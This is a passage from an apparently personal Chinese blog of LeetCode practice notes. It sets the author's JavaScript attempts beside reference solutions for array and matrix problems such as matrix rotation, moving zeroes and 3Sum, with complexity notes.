id="思路1-amp-题解-3"><a href="#思路1-amp-题解-3" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span>(<span class="params">matrix</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n = matrix.length;</span><br><span class="line">    <span class="keyword">const</span> matrix_new = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>).map(<span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            matrix_new[j][n - i - <span class="number">1</span>] = matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            matrix[i][j] = matrix_new[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>js初始化二维数组：（太巧妙了，不像我那样双重for循环）</p><p><code>new Array(n).fill(0).map(() =&gt; new Array(n).fill(0))</code> </p></li><li><p>把matrix.length的值提早赋值给n，因为后面需要用到多次。提高效率</p></li></ul><p>时间复杂度：O(N^2)，其中 N 是 matrix 的边长。</p><h3 id="思路2-amp-题解-3"><a href="#思路2-amp-题解-3" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>用翻转操作代替旋转操作（旋转好难，看不懂就先不写了）</p><p>为了直观显示，就直接放lc题解中的图片了。</p><p><img src="https://i.loli.net/2021/06/13/rod8EOIMj42X3ya.jpg" alt="Snipaste_2021-06-13_11-26-28.jpg"></p><p><img src="https://i.loli.net/2021/06/13/VArObSCjZcaifH7.jpg" alt="Snipaste_2021-06-13_11-27-24.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span>(<span class="params">matrix</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n = matrix.length;</span><br><span class="line">    <span class="comment">// 水平翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">Math</span>.floor(n / <span class="number">2</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            [matrix[i][j], matrix[n - i - <span class="number">1</span>][j]] = [matrix[n - i - <span class="number">1</span>][j], matrix[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 主对角线翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            [matrix[i][j], matrix[j][i]] = [matrix[j][i], matrix[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(N^2)，其中 N 是 matrix 的边长。对于每一次翻转操作，我们都需要枚举矩阵中一半的元素。</p><h3 id="思路3-amp-题解-1"><a href="#思路3-amp-题解-1" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><p>倒叙倒置法：先将矩阵转置，然后将每一行row倒序（reserve）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> rotate = <span class="function">(<span class="params">matrix</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n=matrix.length</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            [matrix[i][j],matrix[j][i]] = [matrix[j][i],matrix[i][j]]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    matrix.forEach(<span class="function"><span class="params">row</span>=&gt;</span> row.reverse())</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode2016——零矩阵（☆☆）"><a href="#LeetCode2016——零矩阵（☆☆）" class="headerlink" title="LeetCode2016——零矩阵（☆☆）"></a>LeetCode2016——零矩阵（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/zero-matrix-lcci/">跳转地址</a></p><h3 id="自己的代码-5"><a href="#自己的代码-5" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> n = matrix.length</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(matrix))  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; matrix[i].length; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (matrix[i][j] === <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; matrix[i].length; a++)&#123;</span><br><span class="line">          arr[i][a]=<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> b = <span class="number">0</span>; b &lt; n; b++)&#123;</span><br><span class="line">          arr[b][j]=<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p>AC 开辟了额外的内存空间，最后需要再赋值回原数组。看题解有不开辟的解法，等以后再看看吧。</p><h2 id="LeetCode498——对角线遍历（☆☆）（todo）"><a href="#LeetCode498——对角线遍历（☆☆）（todo）" class="headerlink" title="LeetCode498——对角线遍历（☆☆）（todo）"></a>LeetCode498——对角线遍历（☆☆）（todo）</h2><p><a href="https://leetcode-cn.com/problems/diagonal-traverse/">跳转地址</a></p><h3 id="自己的代码-6"><a href="#自己的代码-6" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>是真不会= =感觉应该分两种情况（一个往右上，一个往左下），先找到几条对角线（2n-1），然后相连？但是每种情况交界（向右向下+1）也不一样。</p><h3 id="思路-amp-题解-2"><a href="#思路-amp-题解-2" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><ol><li>只有两种移动方向：<br>右上移动 <code>i-=1; j+=1</code><br>左下移动 <code>i+=1; j-=1</code></li><li>处理上下左右编辑问题</li><li>越界即转弯</li></ol><p><a href="https://leetcode-cn.com/problems/diagonal-traverse/solution/dui-jiao-xian-bian-li-chao-jian-dan-while-jie-fa-b/">代码好长</a>，超过50行真的就不想看了aa.</p><h2 id="LeetCode561——数组拆分-I（☆）"><a href="#LeetCode561——数组拆分-I（☆）" class="headerlink" title="LeetCode561——数组拆分 I（☆）"></a>LeetCode561——数组拆分 I（☆）</h2><p><a href="https://leetcode-cn.com/problems/array-partition-i/">跳转地址</a></p><h3 id="自己的代码-7"><a href="#自己的代码-7" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>好像需要实现全排列？但其实最大总和一定是两个最小一组，两个次小一组。。一直到两个最大一组，但是这怎么用代码实现呢？感觉这不该是一道easy，是我太菜了=</p><h3 id="思路-amp-题解-3"><a href="#思路-amp-题解-3" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>排序：<img src="https://i.loli.net/2021/06/16/mbS8nil2HVIaUox.jpg" alt="Snipaste_2021-06-16_21-56-57.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arrayPairSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">        ans += nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>好吧，实在是太巧妙了。想到排序但是没想到累加偶数项就可以了。。</p><p>时间复杂度：O(nlogn)，即为对数组 nums 进行排序的时间复杂度。</p><h2 id="LeetCode209——长度最小的子数组（☆☆）"><a href="#LeetCode209——长度最小的子数组（☆☆）" class="headerlink" title="LeetCode209——长度最小的子数组（☆☆）"></a>LeetCode209——长度最小的子数组（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/">跳转地址</a></p><h3 id="自己的代码-8"><a href="#自己的代码-8" class="headerlink" title="自己的代码"></a>自己的代码</h3><p><del>没有头绪= 想的是可以定义一个sum求和函数，然后对nums数组一位、两位进行遍历，但这样很麻烦还实现不了。</del></p><p>如果找到一个子数组，如何继续遍历找下一个子数组呢？（从第nums[i]开始？）</p><p>没想到思路写着写着就做出来了，虽然用时垫底5%。。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minSubArrayLen = <span class="function"><span class="keyword">function</span>(<span class="params">target, nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> minCount=<span class="number">10000</span></span><br><span class="line">  <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (nums.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b) &lt; target) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; nums.length; j++)&#123;</span><br><span class="line">      sum += nums[j];</span><br><span class="line">      <span class="keyword">if</span> (sum &gt;= target) &#123;</span><br><span class="line">        count = j - i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (minCount &gt; count) &#123;</span><br><span class="line">          minCount = count;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> minCount</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路-amp-题解-4"><a href="#思路-amp-题解-4" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>双指针+滑动窗口：</p><p><img src="https://i.loli.net/2021/06/17/RNI5kP2Cxwp9BJa.jpg" alt="Snipaste_2021-06-17_14-48-02.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minSubArrayLen = <span class="function"><span class="keyword">function</span>(<span class="params">s, nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> int_max = <span class="built_in">Number</span>.MAX_SAFE_INTEGER</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, sum = <span class="number">0</span>, ans = int_max</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> right = <span class="number">0</span>; right &lt; nums.length; right++) &#123;</span><br><span class="line">        sum += nums[right]</span><br><span class="line">        <span class="keyword">while</span> (sum &gt;= s) &#123;</span><br><span class="line">            ans = <span class="built_in">Math</span>.min(ans, right - left + <span class="number">1</span>)</span><br><span class="line">            sum -= nums[left++]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans === int_max ? <span class="number">0</span> : ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n),每个指针移动都需要O(n) 的时间,每个元素最多被访问2次</p><h2 id="LeetCode118——杨辉三角（☆）"><a href="#LeetCode118——杨辉三角（☆）" class="headerlink" title="LeetCode118——杨辉三角（☆）"></a>LeetCode118——杨辉三角（☆）</h2><p><a href="https://leetcode-cn.com/problems/pascals-triangle/">跳转地址</a></p><h3 id="自己的代码-9"><a href="#自己的代码-9" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span> (<span class="params">numRows</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(numRows)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">    arr[i]=<span class="keyword">new</span> <span class="built_in">Array</span>(i+<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numRows; i++)&#123;</span><br><span class="line">    arr[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; i; j++)&#123;</span><br><span class="line">      arr[i][j] = arr[i - <span class="number">1</span>][j - <span class="number">1</span>] + arr[i - <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    arr[i][i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实不难，毕竟easy题。但是看了答案后发现自己多了很多冗余代码，比如创建二维数组，完全可以先 var arr=[]，然后最后再push的方式创建；还有就是不必第一个和最后一个赋值1，可以用fill(1)的方式。</p><h3 id="思路-amp-题解-5"><a href="#思路-amp-题解-5" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span>(<span class="params">numRows</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> row = <span class="keyword">new</span> <span class="built_in">Array</span>(i + <span class="number">1</span>).fill(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; row.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            row[j] = ret[i - <span class="number">1</span>][j - <span class="number">1</span>] + ret[i - <span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        ret.push(row);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O*(*numRows^2)。</p><h2 id="LeetCode557——反转字符串（☆）"><a href="#LeetCode557——反转字符串（☆）" class="headerlink" title="LeetCode557——反转字符串（☆）"></a>LeetCode557——反转字符串（☆）</h2><p><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">跳转地址</a></p><h3 id="自己的代码-10"><a href="#自己的代码-10" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = []</span><br><span class="line">  <span class="keyword">var</span> s1=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] !== <span class="string">&quot; &quot;</span>) &#123;</span><br><span class="line">      arr.push(s[i])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      s1=s1+arr.reverse().join(<span class="string">&quot;&quot;</span>)+<span class="string">&quot; &quot;</span>;</span><br><span class="line">      arr=[]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  s1=s1+arr.reverse().join(<span class="string">&quot;&quot;</span>)+<span class="string">&quot; &quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> s1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC， 磨磨蹭蹭写了半天才做对，还是api没用精啊。</p><h3 id="思路-amp-题解-6"><a href="#思路-amp-题解-6" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><ul><li><code>split</code>字符串 转 单词数组</li><li><code>map</code>修改每个单词 = 单词 转 数组 <code>reverse</code> 转 单词</li><li><code>join</code>单词数组 转 字符串</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&#x27; &#x27;</span>).map(<span class="function"><span class="params">x</span> =&gt;</span> x.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>)).join(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以后每做一道题得先想清楚思路了，这道题如果想清楚，先分割成单词，再把每个单词分割成字母，再反转，再连接，很快就行了。</p><h2 id="LeetCode283——移动零（☆）"><a href="#LeetCode283——移动零（☆）" class="headerlink" title="LeetCode283——移动零（☆）"></a>LeetCode283——移动零（☆）</h2><p><a href="https://leetcode-cn.com/problems/move-zeroes/">跳转地址</a></p><h3 id="自己的代码-11"><a href="#自己的代码-11" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> moveZeroes = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = nums.length; i--;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] === <span class="number">0</span>) &#123;</span><br><span class="line">      nums.splice(i, <span class="number">1</span>);</span><br><span class="line">      nums.push(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不难，主要是优化：每次执行 splice 相当于把 i 后的数都向前移一位，时间复杂度O(n)， for 循环也是O(n)，所以代码时间复杂度为O(n^2)。</p><h3 id="思路-amp-题解-7"><a href="#思路-amp-题解-7" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>双指针：</p><ol><li>左指针左边均为非零数；</li><li>右指针左边直到左指针处均为零。</li><li>因此每次交换，都是将左指针的零与右指针的非零数交换，且非零数的相对顺序并未改变</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> moveZeroes = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> length = nums.length;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> right = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (right &lt; length) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[right]) &#123;</span><br><span class="line">          [nums[left],nums[right]]=[nums[right],nums[left]]</span><br><span class="line">          left++;</span><br><span class="line">      &#125;</span><br><span class="line">      right++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 另一种解法</span></span><br><span class="line"><span class="keyword">var</span> moveZeroes = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] !== <span class="number">0</span>)&#123;</span><br><span class="line">            nums[pos++] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = pos; i &lt; nums.length; i++) &#123;</span><br><span class="line">        nums[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n)，其中 n 为序列长度。每个位置至多被遍历两次。</p><h2 id="LeetCode70——爬楼梯（☆）"><a href="#LeetCode70——爬楼梯（☆）" class="headerlink" title="LeetCode70——爬楼梯（☆）"></a>LeetCode70——爬楼梯（☆）</h2><p><a href="https://leetcode-cn.com/problems/climbing-stairs/">跳转地址</a></p><h3 id="自己的代码-12"><a href="#自己的代码-12" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>完全不会，没有一点思路。</p><h3 id="思路-amp-题解-8"><a href="#思路-amp-题解-8" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>动态规划：分成多个子问题<strong>（找最近重复子问题）</strong>，爬第 n 阶楼梯的方法数量，等于 2 部分之和：</p><ul><li>爬上 n-1 阶楼梯的方法数量。因为再爬 1 阶就能到第 n 阶</li><li>爬上 n-2 阶楼梯的方法数量。因为再爬 2 阶就能到第 n 阶</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> climbStairs = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dp = [];</span><br><span class="line">  dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 压缩空间：dp[i] 只与过去的两项：dp[i-1] 和 dp[i-2] 有关，没有必要存下所有计算过的 dp 项。所以用两个变量去存这两个过去的状态就好。</span></span><br><span class="line"><span class="keyword">var</span> climbStairs = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> f1 = <span class="number">0</span>, f2 = <span class="number">1</span>, f3;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n + <span class="number">1</span> ; i++) &#123;</span><br><span class="line">    f3 = f1 + f2;</span><br><span class="line">    f1 = f2;</span><br><span class="line">    f2 = f3; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O（n）</p><h2 id="LeetCode15——三数之和（☆☆-高频）"><a href="#LeetCode15——三数之和（☆☆-高频）" class="headerlink" title="LeetCode15——三数之和（☆☆ 高频）"></a>LeetCode15——三数之和（☆☆ 高频）</h2><p><a href="https://leetcode-cn.com/problems/3sum/">跳转地址</a></p><h3 id="自己的代码-13"><a href="#自己的代码-13" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> num, arr = [], res = [];</span><br><span class="line">  nums = nums.sort();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++)&#123;</span><br><span class="line">      num = <span class="number">0</span> - nums[i] - nums[j];</span><br><span class="line">      <span class="keyword">if</span> (nums.indexOf(num) &gt; j) &#123;</span><br><span class="line">        arr.push(nums[i]);</span><br><span class="line">        arr.push(nums[j]);</span><br><span class="line">        arr.push(num);</span><br><span class="line">        res.push(arr);</span><br><span class="line">        arr = [];</span><br><span class="line">        i++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没过，if() 中的逻辑有点懵了，不知道如何去重。</p><h3 id="思路1-amp-题解-4"><a href="#思路1-amp-题解-4" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>三重循环（这竟然没想到）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length - <span class="number">1</span>; j++) &#123; </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> k = j + <span class="number">1</span>; k &lt; nums.length; k++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (nums[i] + nums[j] + nums[k] === <span class="number">0</span>) &#123; </span><br><span class="line">          res.push([nums[i], nums[j], nums[k]])</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n^3)，n 为数组长度</p><h3 id="思路2-amp-题解-4"><a href="#思路2-amp-题解-4" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>首先对数组排序！太重要了。（自己写的时候到最后才想到这一点）</p><ul><li>排序后固定一个数 nums[i]，再使用左右指针指向 nums[i]后面的两端，数字分别为 nums[L] 和 nums[R]，计算三个数的和 sum 判断是否满足为 0，满足则添加进结果集。</li><li>如果 nums[i]大于 0，则三数之和必然无法等于 0，结束循环。</li><li>如果 nums[i] = nums[i−1]，则说明该数字重复，会导致结果重复，所以应该跳过。</li><li>当 sum = 0 时，nums[L] = nums[L+1] 则会导致结果重复，应该跳过，L++。</li><li>当 sum = 0 时，nums[R] = nums[R-1] 则会导致结果重复，应该跳过，R−−。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">const</span> length = nums.length;</span><br><span class="line">  <span class="keyword">if</span> (nums === <span class="literal">null</span> || length &lt; <span class="number">3</span>) <span class="keyword">return</span> ans;</span><br><span class="line">  nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123; <span class="keyword">break</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] === nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">let</span> L = i + <span class="number">1</span>, R = length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (L &lt; R) &#123;</span><br><span class="line">      <span class="keyword">let</span> sum = nums[i] + nums[L] + nums[R];</span><br><span class="line">      <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">        ans.push([nums[i], nums[L], nums[R]]);</span><br><span class="line">        <span class="keyword">while</span> (L &lt; R &amp;&amp; nums[L] === nums[L + <span class="number">1</span>]) L++;</span><br><span class="line">        <span class="keyword">while</span> (L &lt; R &amp;&amp; nums[R] === nums[R - <span class="number">1</span>]) R--;</span><br><span class="line">        L++;</span><br><span class="line">        R--;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        L++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        R--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n^2)，n 为数组长度</p><h3 id="思路3-amp-题解-2"><a href="#思路3-amp-题解-2" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><p>哈希表（todo）</p><h2 